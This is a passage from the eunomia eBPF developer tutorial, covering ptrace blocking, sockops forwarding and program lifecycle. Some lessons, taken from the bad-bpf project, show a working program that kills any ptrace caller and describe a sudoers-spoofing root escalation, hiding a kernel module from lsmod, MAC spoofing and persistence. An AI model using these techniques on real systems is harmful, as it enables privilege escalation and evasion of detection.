&lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"common.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\n// Ringbuffer Map to pass messages from kernel to user\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\n// Optional Target Parent PID\nconst volatile int target_ppid = 0;\n\nSEC(\"tp/syscalls/sys_enter_ptrace\")\nint bpf_dos(struct trace_event_raw_sys_enter *ctx)\n{\n    long ret = 0;\n    size_t pid_tgid = bpf_get_current_pid_tgid();\n    int pid = pid_tgid &gt;&gt; 32;\n\n    // if target_ppid is 0 then we target all pids\n    if (target_ppid != 0) {\n        struct task_struct *task = (struct task_struct *)bpf_get_current_task();\n        int ppid = BPF_CORE_READ(task, real_parent, tgid);\n        if (ppid != target_ppid) {\n            return 0;\n        }\n    }\n\n    // Send signal. 9 == SIGKILL\n    ret = bpf_send_signal(9);\n\n    // Log event\n    struct event *e;\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (e) {\n        e-&gt;success = (ret == 0);\n        e-&gt;pid = pid;\n        bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n        bpf_ringbuf_submit(e, 0);\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>License Declaration</li> </ul> <p>The program's license is declared as \"Dual BSD/GPL\". This is to meet the Linux kernel's licensing requirements for eBPF programs.</p> <ul> <li>Ringbuffer Map</li> </ul> <p>This is a ring buffer type map that allows messages generated by the eBPF program in kernel space to be efficiently read by user space programs.</p> <ul> <li>Target Parent Process ID</li> </ul> <p><code>target_ppid</code> is an optional parent process ID used to limit which processes are affected. If set to a non-zero value, only processes that match it will be targeted.</p> <ul> <li> <p>Main Function <code>bpf_dos</code></p> </li> <li> <p>Process Check     The program first retrieves the current process's ID. If <code>target_ppid</code> is set, it also retrieves the current process's parent process ID and compares them. If they don't match, it returns immediately.</p> </li> <li> <p>Sending Signal     It uses <code>bpf_send_signal(9)</code> to send a <code>SIGKILL</code> signal. This terminates the process calling <code>ptrace</code>.</p> </li> <li> <p>Logging the Event     The event is logged using the ring buffer map. This includes whether the signal was successfully sent, the process ID, and the process's command name.</p> </li> </ul> <p>In summary, this eBPF program provides a method that allows system administrators or security teams to monitor and intervene <code>ptrace</code> calls at the kernel level, offering an additional layer against potential malicious activities or misoperations.</p>"},{"location":"tutorials/25-signal/#compilation-and-execution","title":"Compilation and Execution","text":"<p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain combined with Wasm. Its purpose is to simplify the development, building, distribution, and execution of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the <code>ecc</code> compiler toolchain and <code>ecli</code> runtime. We use eunomia-bpf to compile and run this example.</p> <p>Compilation:</p> <pre><code>./ecc signal.bpf.c signal.h\n</code></pre> <p>Usage:</p> <pre><code>$ sudo ./ecli package.json\nTIME     PID    COMM   SUCCESS\n</code></pre> <p>This program will send a <code>SIG_KILL</code> signal to any program attempting to use the <code>ptrace</code> system call, such as <code>strace</code>. Once the eBPF program starts running, you can test it by running the following command:</p> <pre><code>$ strace /bin/whoami\nKilled\n</code></pre> <p>The original console will output:</p> <pre><code>INFO [bpf_loader_lib::skeleton] Running ebpf program...\nTIME     PID    COMM   SUCCESS \n13:54:45  8857  strace true\n</code></pre> <p>The complete source code can be found at: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/25-signal</p>"},{"location":"tutorials/25-signal/#conclusion","title":"Conclusion","text":"<p>Through this example, we delved into how to combine eBPF programs with user-space programs to monitor and intervene in system calls. eBPF provides a mechanism for executing programs in kernel space. This technology is not limited to monitoring but can also be used for performance optimization, security defense, system diagnostics, and various other scenarios. For developers, it offers a powerful and flexible tool for performance tuning and troubleshooting in Linux systems.</p> <p>Lastly, if you are interested in eBPF technology and wish to further understand and practice, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial and tutorial website https://eunomia.dev/zh/tutorials/.</p>"},{"location":"tutorials/25-signal/#references","title":"References","text":"<ul> <li>https://github.com/pathtofile/bad-bpf</li> <li>https://www.mail-archive.com/netdev@vger.kernel.org/msg296358.html</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/25-signal</p> <p>Share on  Share on </p>"},{"location":"tutorials/26-sudo/","title":"Using eBPF to add sudo user","text":"<p>The full source code for this article can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/26-sudo</p> <p>Compilation:</p> <pre><code>make\n</code></pre> <p>Usage:</p> <pre><code>sudo ./sudoadd --username lowpriv-user\n</code></pre> <p>This program allows a user with lower privileges to become root using <code>sudo</code>.</p> <p>It works by intercepting <code>sudo</code> reading the <code>/etc/sudoers</code> file and overwriting the first line with <code>&lt;username&gt; ALL=(ALL:ALL) NOPASSWD:ALL #</code>. This tricks <code>sudo</code> into thinking that the user is allowed to become root. Other programs like <code>cat</code> or <code>sudoedit</code> are not affected, so the file remains unchanged and the user does not have these permissions. The <code>#</code> at the end of the line ensures that the rest of the line is treated as a comment, so it does not break the logic of the file.</p>"},{"location":"tutorials/26-sudo/#references","title":"References","text":"<ul> <li>https://github.com/pathtofile/bad-bpf</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/27-replace/","title":"Replace Text Read or Written by Any Program with eBPF","text":"<p>See https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/27-replace for the full source code.</p> <p>Compile:</p> <pre><code>make\n</code></pre> <p>Usage:</p> <pre><code>sudo ./replace --filename /path/to/file --input foo --replace bar\n</code></pre> <p>This program will replace all text in the file that matches 'input' with 'replace' text. There are many use cases for this, such as:</p> <p>Hiding the kernel module 'joydev' to avoid detection by tools like 'lsmod':</p> <pre><code>./replace -f /proc/modules -i 'joydev' -r 'cryptd'\n</code></pre> <p>Spoofing the MAC address of the 'eth0' interface:</p> <pre><code>./replace -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'\n</code></pre> <p>Malware performing anti-sandbox checks may look for MAC addresses as an indication of whether it is running in a virtual machine or sandbox, rather than on a \"real\" machine.</p> <p>Note: The lengths of 'input' and 'replace' must be the same to avoid introducing NULL characters in the middle of the text block. To input a newline character at a bash prompt, use <code>$'\\n'</code>, for example <code>--replace $'text\\n'</code>.</p>"},{"location":"tutorials/27-replace/#references","title":"References","text":"<ul> <li>https://github.com/pathtofile/bad-bpf.</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/28-detach/","title":"Running eBPF After Application Exits: The Lifecycle of eBPF Programs","text":"<p>eBPF (Extended Berkeley Packet Filter) is a revolutionary technology in the Linux kernel that allows users to execute custom programs in kernel space without modifying the kernel source code or loading any kernel modules. This provides developers with great flexibility to observe, modify, and control the Linux system.</p> <p>This article introduces the Lifecycle of eBPF Programs, how to run eBPF programs after user-space application exits, and how to use pin to share eBPF objects between processes. This article is part of the eBPF Developer Tutorial, more details can be found in https://github.com/eunomia-bpf/bpf-developer-tutorial and https://eunomia.dev/tutorials</p> <p>By using the detach method to run eBPF programs, the user space loader can exit without stopping the eBPF program. Another common use case for pinning is sharing eBPF objects between processes. For example, one could create a Map from Go, pin it, and inspect it using <code>bpftool map dump pinned /sys/fs/bpf/my_map</code>.</p>"},{"location":"tutorials/28-detach/#the-lifecycle-of-ebpf-programs","title":"The Lifecycle of eBPF Programs","text":"<p>File descriptors and reference counters are used to manage BPF objects (progs, maps, and debug info). When a map is created, the kernel initializes its reference counter to 1 and returns a file descriptor to the user space process. If the process exits or crashes, the file descriptor is closed and the reference counter of the map is decremented. After the RCU grace period, the map is freed from memory.</p> <p>BPF programs that use BPF maps are loaded in two phases. The maps are created and their file descriptors are stored in the program's 'imm' field. The kernel increments the reference counters of the maps used by the program and initializes the program's reference counter to 1. Even if the user space process closes the file descriptors associated with the maps, the maps will not disappear because the program is still \"using\" them. When the file descriptor of the program is closed and its reference counter reaches zero, the destruction logic decrements the reference counters of all maps used by the program. This allows the same map to be used by multiple programs at once.</p> <p>When a program is attached to a hook, its reference counter is incremented. The user space process that created the maps and program can then exit, and the maps and program will remain alive as long as their reference counters are greater than zero. This is the lifecycle of a BPF object.</p> <p>Not all attachment points are the same. XDP, tc's clsact, and cgroup-based hooks are global, meaning that programs will stay attached to them as long as the corresponding objects are alive. On the other hand, programs attached to kprobe, uprobe, tracepoint, perf_event, raw_tracepoint, socket filters, and so_reuseport hooks are local to the process. If the process crashes or closes the file descriptors associated with these hooks, the kernel will detach the BPF program and decrement its reference counter.</p> <p>The file descriptor based interface provides auto-cleanup, meaning that if anything goes wrong with the user space process, the kernel will automatically clean up all BPF objects. This interface is useful for networking as well. The use of BPFFS (BPF File System) allows a process to pin a BPF program or map, which increments their reference counters and keeps them alive even if they are not attached or used by any program. This is useful when an admin wants to examine a map even when the associated program is not running.</p> <p>Detach and replace are important aspects of the lifetime of a BPF program. The detach hook prevents the execution of a previously attached program from any future events, while the replace feature allows a program to be replaced in cgroup-based hooks. There is a window where the old and new programs can be executing on different CPUs, but the kernel guarantees that one of them will be processing events. Some BPF developers use a scheme where the new program is loaded with the same maps as the old program to ensure safe replacement.</p> <p>Overall, understanding the lifetime of BPF programs and maps is crucial for users to use BPF safely and without surprises. The use of file descriptors, reference counters, and BPFFS helps manage the lifecycle of BPF objects, ensuring their proper creation, attachment, detachment, and replacement.</p>"},{"location":"tutorials/28-detach/#ebpf-in-kubernetes-deploy-ebpf-programs-via-remote-procedure-call","title":"eBPF in Kubernetes: Deploy eBPF Programs via Remote Procedure Call","text":"<p>In a Kubernetes environment, deploying eBPF programs often necessitates a higher level of system privileges. Typically, these applications require at least CAP_BPF permissions, and depending on the program type, they may need even more. This requirement poses a challenge in a multi-tenant Kubernetes environment where granting extensive privileges can be a security risk.</p>"},{"location":"tutorials/28-detach/#using-pin-to-mitigate-privilege-requirements","title":"Using Pin to Mitigate Privilege Requirements","text":"<p>One way to address the privilege issue is through the use of pinning eBPF maps. Pinning allows eBPF objects to persist beyond the life of the process that created them, making them accessible to other processes. This method can be particularly useful in Kubernetes, where different containers might need to interact with the same eBPF objects.</p> <p>For example, an eBPF map can be created and pinned by a privileged initializer container. Subsequent containers, which may run with fewer privileges, can then interact with the pinned eBPF objects. This approach limits the need for elevated privileges to the initialization phase, thereby enhancing overall security.</p>"},{"location":"tutorials/28-detach/#the-role-of-bpfman-in-ebpf-lifecycle-management","title":"The Role of bpfman in eBPF Lifecycle Management","text":"<p>The bpfman project can play a crucial role in this context. bpfman, or BPF Daemon, is designed to manage the lifecycle of eBPF programs and maps in a more controlled and secure manner. It acts as a mediator between user space and kernel space, providing a mechanism to load and manage eBPF programs without granting extensive privileges to each individual container or application.</p> <p>In Kubernetes, bpfman could be deployed as a privileged service, responsible for loading and managing eBPF programs across different nodes in the cluster. It can handle the intricacies of eBPF lifecycle management, such as loading, unloading, updating eBPF programs, and managing their state. This centralized approach simplifies the deployment and management of eBPF programs in a Kubernetes cluster, while adhering to security best practices.</p>"},{"location":"tutorials/28-detach/#use-detach-to-replace-by-any-program-with-ebpf-after-it-exits","title":"Use Detach to Replace by Any Program with eBPF After it Exits","text":"<p>In libbpf, the <code>bpf_object__pin_maps</code> function can be used to pin the maps in the BPF object, the programs and links has similar API.</p> <p>Here we use similar programs as textreplace in the previous section to demonstrate the detach method, the pin eBPF code is like:</p> <pre><code>int pin_program(struct bpf_program *prog, const char* path)\n{\n    int err;\n    err = bpf_program__pin(prog, path);\n        if (err) {\n            fprintf(stdout, \"could not pin prog %s: %d\\n\", path, err);\n            return err;\n        }\n    return err;\n}\n\nint pin_map(struct bpf_map *map, const char* path)\n{\n    int err;\n    err = bpf_map__pin(map, path);\n        if (err) {\n            fprintf(stdout, \"could not pin map %s: %d\\n\", path, err);\n            return err;\n        }\n    return err;\n}\n\nint pin_link(struct bpf_link *link, const char* path)\n{\n    int err;\n    err = bpf_link__pin(link, path);\n        if (err) {\n            fprintf(stdout, \"could not pin link %s: %d\\n\", path, err);\n            return err;\n        }\n    return err;\n}\n</code></pre>"},{"location":"tutorials/28-detach/#running","title":"Running","text":"<p>Here, we still use the example of string replacement used in the previous application to demonstrate potential security risks. By using <code>--detach</code> to run the program, the user space loader can exit without stopping the eBPF program.</p> <p>The code of This example can be found in https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/28-detach</p> <p>Compilation:</p> <pre><code>make\n</code></pre> <p>Before running, please make sure that the BPF file system has been mounted:</p> <pre><code>sudo mount bpffs -t bpf /sys/fs/bpf\nmkdir /sys/fs/bpf/textreplace\n</code></pre> <p>Then, you can run text-replace2 with detach:</p> <pre><code>./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd' -d\n</code></pre> <p>This will create some eBPF link files under <code>/sys/fs/bpf/textreplace</code>. Once the loader is successfully running, you can check the log by running the following command:</p> <pre><code>sudo cat /sys/kernel/debug/tracing/trace_pipe\n# Confirm that the link files exist\nsudo ls -l /sys/fs/bpf/textreplace\n</code></pre> <p>Finally, to stop, simply delete the link files:</p> <pre><code>sudo rm -r /sys/fs/bpf/textreplace\n</code></pre>"},{"location":"tutorials/28-detach/#references","title":"References","text":"<p>You can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/zh/tutorials/ for more examples and a complete tutorial.</p> <ul> <li>https://github.com/pathtofile/bad-bpf</li> <li>https://facebookmicrosites.github.io/bpf/blog/2018/08/31/object-lifetime.html</li> <li>https://bpfman.io/main/blog/2023/09/07/bpfman-a-novel-way-to-manage-ebpf</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/28-detach</p> <p>Share on  Share on </p>"},{"location":"tutorials/29-sockops/","title":"eBPF Development Practices: Accelerating Network Request Forwarding with Sockops","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful feature in the Linux kernel that allows running, loading, and updating user-defined code without the need to modify the kernel source code or reboot the kernel. This capability makes eBPF widely used in various areas such as network and system performance analysis, packet filtering, security policies, etc.</p> <p>This tutorial will focus on the application of eBPF in the networking domain, specifically how to use sockops-type eBPF programs to accelerate the forwarding of local network requests. This application is often valuable in scenarios where software load balancers are used for request forwarding, such as using tools like Nginx or HAProxy.</p> <p>In many workloads, such as inter-service communication in a microservices architecture, the performance overhead of network requests made through the loopback interface can significantly impact the overall application performance. Since these requests have to go through the local network stack, their processing performance can become a bottleneck, especially in high-concurrency scenarios. To address this issue, sockops-type eBPF programs can be used to accelerate local request forwarding, providing functionality similar to direct memory access (DMA). Sockops programs can manage sockets in the kernel space and directly forward packets between sockets on the local machine, reducing the CPU time required for packet forwarding in the TCP/IP stack.</p> <p>This tutorial will demonstrate how to use sockops-type eBPF programs to accelerate network request forwarding through a specific example. To help you understand how to use sockops programs, we will step by step introduce the code of the example program and discuss the working principle of each part. The complete source code and project can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/29-sockops.</p>"},{"location":"tutorials/29-sockops/#leveraging-ebpf-sockops-for-performance-optimization","title":"Leveraging eBPF Sockops for Performance Optimization","text":"<p>Network connections are essentially communication between sockets, and eBPF provides a <code>bpf_msg_redirect_hash</code> function that allows packets sent by an application to be directly forwarded to the corresponding socket on the recipient side, greatly accelerating the packet processing flow in the kernel.</p> <p>Here, the <code>sock_map</code> is a key component that stores socket rules, i.e., it selects an existing socket connection from the <code>sock_map</code> based on the current packet information. Therefore, it is necessary to save the socket information to the <code>sock_map</code> at the hook of the sockops or elsewhere and provide a rule (usually a four-tuple) to find the socket based on the key.</p> <p>The Merbridge project has achieved acceleration for Istio by replacing iptables with eBPF. After using Merbridge (eBPF) optimization, the inbound and outbound traffic bypasses many kernel modules, significantly improving performance, as shown in the following diagram:</p> <p></p>"},{"location":"tutorials/29-sockops/#example-program","title":"Example Program","text":"<p>This example program redirects traffic from the sender\u2019s socket (outgoing) to the recipient\u2019s socket (incoming), bypassing the TCP/IP kernel network stack. In this example, we assume that the sender and recipient are both running on the same machine. This example program has two parts that share a map definition:</p> <p>bpf_sockmap.h</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_endian.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n\n#define LOCALHOST_IPV4 16777343\n\nstruct sock_key {\n    __u32 sip;\n    __u32 dip;\n    __u32 sport;\n    __u32 dport;\n    __u32 family;\n};\n\nstruct {\n __uint(type, BPF_MAP_TYPE_SOCKHASH);\n __uint(max_entries, 65535);\n __type(key, struct sock_key);\n __type(value, int);\n} sock_ops_map SEC(\".maps\");\n</code></pre> <p>The BPF program in this example is divided into two parts: <code>bpf_redirect.bpf.c</code> and <code>bpf_contrack.bpf.c</code>.</p> <ul> <li> <p>The BPF code in <code>bpf_contrack.bpf.c</code> defines a socket operation (<code>sockops</code>) program, whose main function is to create an entry in the <code>sock_ops_map</code> BPF map in which it stores the five-tuple (source address, destination address, source port, destination port, protocol) for each new TCP connection established on the local machine (using localhost). This BPF map is defined as type <code>BPF_MAP_TYPE_SOCKHASH</code> and can store sockets and their corresponding five-tuple. This allows the five-tuple information of each local TCP connection to be found in the BPF map whenever the connection is created.</p> </li> <li> <p>The BPF code in <code>bpf_redirect.bpf.c</code> defines a sk_msg handler that is called when a message arrives on a local socket. The sk_msg program checks if the message is from a local address, and if so, it retrieves the five-tuple (source address, destination address, source port, destination port, protocol) from the message and looks up the corresponding socket in the <code>sock_ops_map</code> using the obtained key. Then, it redirects the message to the socket found in the <code>sock_ops_map</code>, thus bypassing the kernel network stack and directly delivering the message from the sender's socket to the receiver's socket.</p> </li> </ul> <p>For example, let's assume that there are two processes running locally, process A binds to port 8000, and process B binds to port 9000. Process A sends a message to process B.</p> <ol> <li> <p>When the TCP connection is first established between process A and process B, the <code>sockops</code> program in <code>bpf_contrack.bpf.c</code> is triggered, and it creates an entry in the <code>sock_ops_map</code> BPF map for the five-tuple <code>{127.0.0.1, 127.0.0.1, 8000, 9000, TCP}</code>, with the value being the socket of process A.</p> </li> <li> <p>When process A sends a message, the <code>sk_msg</code> program in <code>bpf_redirect.bpf.c</code> is triggered, and it redirects the message from process A's socket to the socket stored in the <code>sock_ops_map</code> based on the obtained five-tuple information (source address, destination address, source port, destination port, protocol). As a result, the message is directly delivered from process A to process B, bypassing the kernel network stack.</p> </li> </ol> <p>This example program uses BPF to efficiently redirect messages from the sender's socket to the recipient's socket during local communication, bypassing the kernel network stack to improve transmission efficiency.</p> <p>bpf_redirect.bpf.c</p> <pre><code>#include \"bpf_sockmap.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"sk_msg\")\nint bpf_redir(struct sk_msg_md *msg)\n{\n    if(msg-&gt;remote_ip4 != LOCALHOST_IPV4 || msg-&gt;local_ip4!= LOCALHOST_IPV4) \n        return SK_PASS;\n\n    struct sock_key key = {\n        .sip = msg-&gt;remote_ip4,\n        .dip = msg-&gt;local_ip4,\n        .dport = bpf_htonl(msg-&gt;local_port), /* convert to network byte order */\n        .sport = msg-&gt;remote_port,\n        .family = msg-&gt;family,\n    };\n    return bpf_msg_redirect_hash(msg, &amp;sock_ops_map, &amp;key, BPF_F_INGRESS);\n}\n</code></pre> <p>bpf_contrack.bpf.c</p> <pre><code>#include \"bpf_sockmap.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"sockops\")\nint bpf_sockops_handler(struct bpf_sock_ops *skops){\n    u32 family, op;\n\n    family = skops-&gt;family;\n    op = skops-&gt;op;\n    if (op != BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB\n        &amp;&amp; op != BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB) {\n        return BPF_OK;\n    }\n\n    if(skops-&gt;remote_ip4 != LOCALHOST_IPV4 || skops-&gt;local_ip4!= LOCALHOST_IPV4) {\n        return BPF_OK;\n    }\n\n    struct sock_key key = {\n        .dip = skops-&gt;remote_ip4,\n        .sip = skops-&gt;local_ip4,\n        .sport = bpf_htonl(skops-&gt;local_port),  /* convert to network byte order */\n        .dport = skops-&gt;remote_port,\n        .family = skops-&gt;family,\n    };\n\n    bpf_printk(\"&gt;&gt;&gt; new connection: OP:%d, PORT:%d --&gt; %d\\n\", op, bpf_ntohl(key.sport), bpf_ntohl(key.dport));\n\n    bpf_sock_hash_update(skops, &amp;sock_ops_map, &amp;key, BPF_NOEXIST);\n    return BPF_OK;\n}\n</code></pre>"},{"location":"tutorials/29-sockops/#compiling-the-ebpf-program","title":"Compiling the eBPF Program","text":"<p>Here, we use libbpf to compile the eBPF program. The complete source code and project can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/29-sockops.</p> <pre><code># Compile the bpf program with libbpf\nmake\n</code></pre>"},{"location":"tutorials/29-sockops/#loading-the-ebpf-program","title":"Loading the eBPF Program","text":"<p>We have created a script to load the eBPF program, which will automatically load both eBPF programs and create a BPF map:</p> <pre><code>sudo ./load.sh\n</code></pre> <p>This script actually performs the following operations:</p> <pre><code>#!/bin/bash\nset -x\nset -e\n\nsudo mount -t bpf bpf /sys/fs/bpf/\n\n# check if old program already loaded\nif [ -e \"/sys/fs/bpf/bpf_sockops\" ]; then\n    echo \"&gt;&gt;&gt; bpf_sockops already loaded, uninstalling...\"\n    ./unload.sh\n    echo \"&gt;&gt;&gt; old program already deleted...\"\nfi\n\n# load and attach sock_ops program\nsudo bpftool prog load bpf_contrack.bpf.o /sys/fs/bpf/bpf_sockops type sockops pinmaps /sys/fs/bpf/\nsudo bpftool cgroup attach \"/sys/fs/cgroup/\" sock_ops pinned \"/sys/fs/bpf/bpf_sockops\"\n\n# load and attach sk_msg program \nsudo bpftool prog load bpf_redirect.bpf.o \"/sys/fs/bpf/bpf_redir\" map name sock_ops_map pinned \"/sys/fs/bpf/sock_ops_map\"\nsudo bpftool prog attach pinned /sys/fs/bpf/bpf_redir msg_verdict pinned /sys/fs/bpf/sock_ops_map\n</code></pre> <p>This is a script for loading BPF programs. Its main function is to load and attach BPF programs to the kernel system, and store the associated BPF maps in the BPF file system so that the BPF programs can access and operate on these maps.</p> <p>Let's take a detailed look at what each line of the script does.</p> <ol> <li><code>sudo mount -t bpf bpf /sys/fs/bpf/</code> mounts the BPF file system, enabling access to and operation on BPF programs and related maps by the system.</li> <li>The condition check <code>[ -e \"/sys/fs/bpf/bpf_sockops\" ]</code> checks whether the <code>/sys/fs/bpf/bpf_sockops</code> file already exists. If it does exist, it means that the <code>bpf_sockops</code> program has already been loaded into the system, so it will be uninstalled using the <code>./unload.sh</code> script.</li> <li><code>sudo bpftool prog load bpf_contrack.bpf.o /sys/fs/bpf/bpf_sockops type sockops pinmaps /sys/fs/bpf/</code> loads the BPF object file <code>bpf_contrack.bpf.o</code> compiled from the <code>bpf_contrack.bpf.c</code> into the BPF file system, storing it in <code>/sys/fs/bpf/bpf_sockops</code>, and specifying its type as <code>sockops</code>. <code>pinmaps /sys/fs/bpf/</code> specifies that the BPF maps associated with the loaded BPF program will be stored under <code>/sys/fs/bpf/</code>.</li> <li><code>sudo bpftool cgroup attach \"/sys/fs/cgroup/\" sock_ops pinned \"/sys/fs/bpf/bpf_sockops\"</code> attaches the <code>bpf_sockops</code> program that has been loaded into the BPF file system to the cgroup (the path is <code>\"/sys/fs/cgroup/\"</code>). After the attachment, all socket operations belonging to this cgroup will be affected by the <code>bpf_sockops</code> program.</li> <li><code>sudo bpftool prog load bpf_redirect.bpf.o \"/sys/fs/bpf/bpf_redir\" map name sock_ops_map pinned \"/sys/fs/bpf/sock_ops_map\"</code> loads the BPF object file <code>bpf_redirect.bpf.o</code> compiled from <code>bpf_redirect.bpf.c</code> into the BPF file system, storing it in <code>/sys/fs/bpf/bpf_redir</code>, and specifying the associated map as <code>sock_ops_map</code>, which is located in <code>/sys/fs/bpf/sock_ops_map</code>.</li> <li><code>sudo bpftool prog attach pinned /sys/fs/bpf/bpf_redir msg_verdict pinned /sys/fs/bpf/sock_ops_map</code> attaches the already loaded <code>bpf_redir</code> program to the <code>sock_ops_map</code> using the <code>msg_verdict</code> attachment type, which means that when the socket associated with this map receives a message, the <code>bpf_redir</code> program will be called to handle it.</li> </ol> <p>In summary, the main function of this script is to load the two BPF programs used to process local socket traffic into the system and attach them to the correct locations so that they can be correctly called, ensuring that they can access and manipulate the associated BPF maps.</p> <p>You can use the bpftool utility to check if these two eBPF programs have been loaded.</p> <pre><code>$ sudo bpftool prog show\n63: sock_ops  name bpf_sockmap  tag 275467be1d69253d  gpl\n loaded_at 2019-01-24T13:07:17+0200  uid 0\n xlated 1232B  jited 750B  memlock 4096B  map_ids 58\n64: sk_msg  name bpf_redir  tag bc78074aa9dd96f4  gpl\n loaded_at 2019-01-24T13:07:17+0200  uid 0\n xlated 304B  jited 233B  memlock 4096B  map_ids 58\n</code></pre>"},{"location":"tutorials/29-sockops/#test-with-iperf3-or-curl","title":"Test with iperf3 or curl","text":"<p>See https://iperf.fr/ to install iperf3.</p> <p>Running the iperf3 Server:</p> <pre><code>iperf3 -s -p 5001\n</code></pre> <p>Running the iperf3 Client:</p> <pre><code>iperf3 -c 127.0.0.1 -t 10 -l 64k -p 5001\n</code></pre> <p>Or you can use curl and python:</p> <pre><code>python3 -m http.server\ncurl http://0.0.0.0:8000/\n</code></pre>"},{"location":"tutorials/29-sockops/#collecting-traces","title":"Collecting Traces","text":"<p>Check the <code>sock_ops</code> trace for local connection establishments.</p> <pre><code>$ ./trace_bpf_output.sh # which is basically sudo cat /sys/kernel/debug/tracing/trace_pipe\niperf3-9516  [001] .... 22500.634108: 0: &lt;&lt;&lt; ipv4 op = 4, port 18583 --&gt; 4135\niperf3-9516  [001] ..s1 22500.634137: 0: &lt;&lt;&lt; ipv4 op = 5, port 4135 --&gt; 18583\niperf3-9516  [001] .... 22500.634523: 0: &lt;&lt;&lt; ipv4 op = 4, port 19095 --&gt; 4135\niperf3-9516  [001] ..s1 22500.634536: 0: &lt;&lt;&lt; ipv4 op = 5, port 4135 --&gt; 19095\n</code></pre> <p>When the connection is established between <code>iperf3 -c</code> and the server, you should see the events above for socket establishment. If you don't see any events, then the eBPF programs may not have been attached correctly.</p> <p>Furthermore, when <code>sk_msg</code> takes effect, you should observe that when capturing local traffic on the loopback interface using tcpdump, only the three-way handshake and four-way termination traffic are captured, and the actual data flow of iperf is not captured. If the iperf data flow is captured, then the eBPF programs may not have been attached correctly.</p> <pre><code>$ ./trace_lo_traffic.sh # tcpdump -i lo port 5001\n\n# Three-way handshake\n13:24:07.181804 IP localhost.46506 &gt; localhost.5001: Flags [S], seq 620239881, win 65495, options [mss 65495,sackOK,TS val 1982813394 ecr 0,nop,wscale 7], length 0\n13:24:07.181815 IP localhost.5001 &gt; localhost.46506: Flags [S.], seq 1084484879, ack 620239882, win 65483, options [mss 65495,sackOK,TS val 1982813394 ecr 1982813394,nop,wscale 7], length 0\n13:24:07.181832 IP localhost.46506 &gt; localhost.5001: Flags [.], ack 1, win 512, options [nop,nop,TS val 1982813394 ecr 1982813394], length 0\n\n# Four-way termination\n13:24:12.475649 IP localhost.46506 &gt; localhost.5001: Flags [F.], seq 1, ack 1, win 512, options [nop,nop,TS val 1982818688 ecr 1982813394], length 0\n13:24:12.479621 IP localhost.5001 &gt; localhost.46506: Flags [.], ack 2, win 512, options [nop,nop,TS val 1982818692 ecr 1982818688], length 0\n13:24:12.481265 IP localhost.5001 &gt; localhost.46506: Flags [F.], seq 1, ack 2, win 512, options [nop,nop,TS val 1982818694 ecr 1982818688], length 0\n13:24:12.481270 IP localhost.46506 &gt; localhost.5001: Flags [.], ack 2, win 512, options [nop,nop,TS val 1982818694 ecr 1982818694], length 0\n</code></pre>"},{"location":"tutorials/29-sockops/#unloading-the-ebpf-program","title":"Unloading the eBPF Program","text":"<pre><code>sudo ./unload.sh\n</code></pre>"},{"location":"tutorials/29-sockops/#references","title":"References","text":"<p>Finally, if you are interested in eBPF technology and want to learn more and practice further, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial and the tutorial website at https://eunomia.dev/.</p> <ul> <li>https://github.com/zachidan/ebpf-sockops</li> <li>https://github.com/merbridge/merbridge</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/29-sockops</p> <p>Share on  Share on </p>"},{"location":"tutorials/3-fentry-unlink/","title":"eBPF Tutorial by Example 3: Monitoring unlink System Calls with fentry","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and execute user-defined code at runtime in the kernel.</p> <p>This article is the third part of the eBPF Tutorial by Example, focusing on capturing unlink system calls using fentry in eBPF.</p>"},{"location":"tutorials/3-fentry-unlink/#fentry","title":"Fentry","text":"<p>fentry (function entry) and fexit (function exit) are two types of probes in eBPF (Extended Berkeley Packet Filter) used for tracing at the entry and exit points of Linux kernel functions. They allow developers to collect information, modify parameters, or observe return values at specific stages of kernel function execution. This tracing and monitoring functionality is very useful in performance analysis, troubleshooting, and security analysis scenarios.</p> <p>Compared to kprobes, fentry and fexit programs have higher performance and availability. In this example, we can directly access the pointers to the functions' parameters, just like in regular C code, without needing various read helpers. The main difference between fexit and kretprobe programs is that fexit programs can access both the input parameters and return values of a function, while kretprobe programs can only access the return value. Starting from the 5.5 kernel, fentry and fexit are available for eBPF programs.</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"fentry/do_unlinkat\")\nint BPF_PROG(do_unlinkat, int dfd, struct filename *name)\n{\n    pid_t 